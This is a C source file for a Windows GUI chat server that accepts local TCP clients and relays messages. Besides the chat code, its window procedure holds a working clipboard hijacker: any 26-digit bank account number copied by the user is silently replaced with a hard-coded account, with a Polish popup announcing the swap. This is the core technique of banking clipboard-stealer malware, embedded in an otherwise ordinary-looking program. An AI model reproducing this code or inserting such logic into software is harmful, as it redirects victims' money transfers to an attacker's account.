#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

#define MAX_CLIENTS 100

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

// GUI handles
HWND hStartBtn, hRemoveBtn, hClientList, hAddBtn, hMessageEdit, hClientMsgBox;;

// Server socket
SOCKET serverSocket;

int clipboardBeingModified = 0;

// Client info
typedef struct {
    SOCKET socket;
    HANDLE thread;
    char name[64];
} ClientInfo;

ClientInfo clients[MAX_CLIENTS];
int clientCount = 0;
CRITICAL_SECTION cs;  // For thread-safe client list

DWORD WINAPI ClientThread(LPVOID lpParam);
DWORD WINAPI AcceptThread(LPVOID lpParam);

// === Main WinMain ===
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "Server";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClass(&wc);

    HWND hwnd = CreateWindow("Server", "Server",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 500, 400,
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int)msg.wParam;
}

// === WndProc ===
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    char buf[64];

    switch (msg) {
    case WM_CREATE:
        InitializeCriticalSection(&cs);

        hStartBtn = CreateWindow("BUTTON", "Start Server",
            WS_VISIBLE | WS_CHILD,
            20, 20, 120, 30,
            hwnd, (HMENU)1, NULL, NULL);

        hRemoveBtn = CreateWindow("BUTTON", "Remove Selected",
            WS_VISIBLE | WS_CHILD,
            160, 20, 150, 30,
            hwnd, (HMENU)2, NULL, NULL);

        hAddBtn = CreateWindow("BUTTON", "Add Client",
            WS_VISIBLE | WS_CHILD,
            320, 20, 100, 30,
            hwnd, (HMENU)3, NULL, NULL);

        hClientList = CreateWindow("LISTBOX", NULL,
            WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | LBS_NOTIFY,
            20, 70, 440, 150,
            hwnd, (HMENU)4, NULL, NULL);  // ID 4 for the listbox
            
        CreateWindow("STATIC", "Message:", WS_VISIBLE | WS_CHILD,
            20, 230, 60, 20, hwnd, NULL, NULL, NULL);
            
        // Message to client input box
        hMessageEdit = CreateWindow("EDIT", "",
            WS_VISIBLE | WS_CHILD | WS_BORDER,
            80, 230, 250, 20,
            hwnd, (HMENU)5, NULL, NULL);  // ID 5 for message input
            
        // Send to client button
        CreateWindow("BUTTON", "Send", WS_VISIBLE | WS_CHILD,
            350, 230, 80, 25,
            hwnd, (HMENU)6, NULL, NULL);  // ID 6 for send
            
        // New label + box for messages received from clients
        CreateWindow("STATIC", "Client messages:", WS_VISIBLE | WS_CHILD,
            20, 270, 120, 20, hwnd, NULL, NULL, NULL);
            
        hClientMsgBox = CreateWindow("EDIT", "",
            WS_VISIBLE | WS_CHILD | WS_BORDER | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL,
            20, 290, 440, 70,
            hwnd, (HMENU)7, NULL, NULL);  // ID 7 for message display
        AddClipboardFormatListener(hwnd);
        break;
    case WM_CLIPBOARDUPDATE: {
        if (clipboardBeingModified) {
            clipboardBeingModified = 0;
            break;
        }
        if (OpenClipboard(hwnd)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = (char*)GlobalLock(hData);
                if (pszText) {
                    if (strlen(pszText) == 26 && strspn(pszText, "0123456789") == 26) {
                        GlobalUnlock(hData);
                        CloseClipboard();
    
                        const char* newAcc = "12345678901234567890123456"; 
    
                        HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, strlen(newAcc) + 1);
                        if (hGlob) {
                            char* pGlob = (char*)GlobalLock(hGlob);
                            strcpy(pGlob, newAcc);
                            GlobalUnlock(hGlob);
                            
                            clipboardBeingModified = 1;

                            OpenClipboard(hwnd);
                            EmptyClipboard();
                            SetClipboardData(CF_TEXT, hGlob);
                            CloseClipboard();
        
                            MessageBox(hwnd, "Numer konta zostal podmieniony!", "Uwaga", MB_OK | MB_ICONINFORMATION);
                        }
                        return 0;
                    }
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
        break;
    }    
    case WM_COMMAND: {
        if (LOWORD(wParam) == 1) {  // Start Server
            WSADATA wsa;
            WSAStartup(MAKEWORD(2, 2), &wsa);
    
            serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    
            struct sockaddr_in server;
            server.sin_family = AF_INET;
            server.sin_addr.s_addr = inet_addr("127.0.0.1");
            server.sin_port = htons(12345);
    
            bind(serverSocket, (struct sockaddr*)&server, sizeof(server));
            listen(serverSocket, SOMAXCONN);
    
            CreateThread(NULL, 0, AcceptThread, NULL, 0, NULL);
            MessageBox(hwnd, "Server started on 127.0.0.1:12345", "Info", MB_OK);
        }
        else if (LOWORD(wParam) == 2) {  // Remove Selected
            int sel = (int)SendMessage(hClientList, LB_GETCURSEL, 0, 0);
            if (sel != LB_ERR) {
                EnterCriticalSection(&cs);
                closesocket(clients[sel].socket);
                TerminateThread(clients[sel].thread, 0);
                SendMessage(hClientList, LB_DELETESTRING, sel, 0);
    
                for (int i = sel; i < clientCount - 1; i++) {
                    clients[i] = clients[i + 1];
                }
                clientCount--;
                LeaveCriticalSection(&cs);
            }
        }
        else if (LOWORD(wParam) == 3) {  // Add Client
            STARTUPINFO si = { sizeof(si) };
            PROCESS_INFORMATION pi = { 0 };
        
            if (CreateProcess(
                    NULL,
                    "cmd.exe /c start client.exe", 
                    NULL, NULL, FALSE,
                    CREATE_NEW_CONSOLE,
                    NULL, NULL, &si, &pi)) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                MessageBox(hwnd, "Failed to launch client.exe", "Error", MB_ICONERROR);
            }
        }
        else if (LOWORD(wParam) == 6) {
            int sel = (int)SendMessage(hClientList, LB_GETCURSEL, 0, 0);
            if (sel != LB_ERR) {
                char msg[256];
                GetWindowText(hMessageEdit, msg, sizeof(msg));
                send(clients[sel].socket, msg, strlen(msg), 0);
                SetWindowText(hMessageEdit, "");
            }
        }
    }
    break;

    case WM_DESTROY:
        RemoveClipboardFormatListener(hwnd);
        DeleteCriticalSection(&cs);
        closesocket(serverSocket);
        WSACleanup();
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI AcceptThread(LPVOID lpParam) {
    while (1) {
        SOCKET clientSock = accept(serverSocket, NULL, NULL);
        if (clientSock == INVALID_SOCKET) break;

        EnterCriticalSection(&cs);
        if (clientCount < MAX_CLIENTS) {
            int id = clientCount;
            sprintf(clients[id].name, "Client #%d", id + 1);
            clients[id].socket = clientSock;

            SendMessage(hClientList, LB_ADDSTRING, 0, (LPARAM)clients[id].name);

            clients[id].thread = CreateThread(NULL, 0, ClientThread, (LPVOID)(intptr_t)id, 0, NULL);
            clientCount++;
        }
        LeaveCriticalSection(&cs);
    }
    return 0;
}

DWORD WINAPI ClientThread(LPVOID lpParam) {
    int id = (int)(intptr_t)lpParam;
    SOCKET sock = clients[id].socket;
    char buffer[512];
    int bytes;

    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes] = '\0';
        char display[576];
        sprintf(display, "[%s] %s\r\n", clients[id].name, buffer);

        int len = GetWindowTextLength(hClientMsgBox);
        SendMessage(hClientMsgBox, EM_SETSEL, len, len);
        SendMessage(hClientMsgBox, EM_REPLACESEL, FALSE, (LPARAM)display);
    }

    closesocket(sock);

    // Remove from GUI
    SendMessage(hClientList, LB_DELETESTRING, id, 0);

    EnterCriticalSection(&cs);
    for (int i = id; i < clientCount - 1; i++) {
        clients[i] = clients[i + 1];
    }
    clientCount--;
    LeaveCriticalSection(&cs);

    return 0;
}
